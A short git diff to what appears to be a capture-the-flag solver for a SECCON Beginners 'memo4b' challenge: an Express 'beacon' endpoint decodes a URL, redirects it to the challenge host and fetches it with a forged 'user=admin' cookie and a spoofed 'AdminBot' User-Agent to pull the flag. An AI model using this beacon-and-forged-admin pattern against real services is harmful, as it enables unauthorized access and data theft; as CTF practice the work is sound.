@@ -17,8 +17,13 @@ app.get('/beacon.jpg/:b64url', async (req, res) => {
       .replace('127.0.0.1:50000', 'memo4b.challenges.beginners.seccon.jp:50000')
       .replace('localhost:50000', 'memo4b.challenges.beginners.seccon.jp:50000');
 
+    const urlObj = new URL(target);
     const flagRes = await fetch(target, {
-      headers: { cookie: 'user=admin' }
+      headers: {
+        cookie: 'user=admin',
+        Host: urlObj.host,
+        'User-Agent': 'Mozilla/5.0 (compatible; AdminBot/1.0)',
+      }
     });
 
     const flagText = await flagRes.text();
